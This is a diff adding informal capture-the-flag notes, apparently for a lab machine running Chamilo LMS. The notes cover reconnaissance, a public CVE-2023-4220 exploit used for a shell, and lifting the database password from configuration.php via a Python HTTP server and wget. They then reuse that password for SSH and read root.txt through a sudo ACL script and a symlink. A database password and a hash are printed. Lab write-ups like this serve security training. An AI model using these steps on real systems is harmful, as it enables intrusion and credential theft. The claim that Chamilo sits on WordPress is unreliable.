@@ -1,0 +1,59 @@
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+8000/tcp closed http-alt
+
+webapp uninteractive
+nothing interesting in js
+can't find any directories
+can't find any subdomains
+can't find any files
+no cookies
+apache 2.4.52 doesn't seem vulnerable to anything obvious
+
+port 8000 seems like a red herring, port knocking doesn't open it
+
+noob mistake, adding the ip to dnsmasq and re-fuzzing the domains found something:
+	www
+	lms  
+should've fuzzed the vhosts i guess
+
+lms is hosting chamilo lms, which seems to be some layer on top of wordpress
+
+quick search finds https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit
+
+we got a shell as www-data
+
+another user in /home is mtz
+
+netstat -tupln shows there's mysql on 3306
+
+apparently chamilo saves db data in configuration.php 
+
+find / -name configuration.php -> /var/www/chamilo/app/config/configuration.php
+
+tar -czvf configuration.tgz /var/www/chamilo/app/config/configuration.php
+
+python3 -m http.server -b 10.10.11.23 11111
+
+after wgetting the archive we get this:
+	$_configuration['db_password'] = '03F6lY3uXAP2bkW8'; 
+
+see tables with mysql -u chamilo -p'03F6lY3uXAP2bkW8' -h localhost -P 3306 -e 'SHOW TABLES' chamilo
+
+password from the user table is 1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra, not crackable with rockyou.txt
+
+db password works for the user ssh (wtf????)
+
+we get user.txt at least
+
+sudo -l says we can run /opt/acl.sh with sudo
+
+this script can change user permissons for files in our home dir
+
+we can link root.txt to our home dir, ln -s /root/root.txt ./
+
+sudo /opt/acl.sh mtz r /home/mtz/root.txt
+
+cat ./root.txt
+
+gg
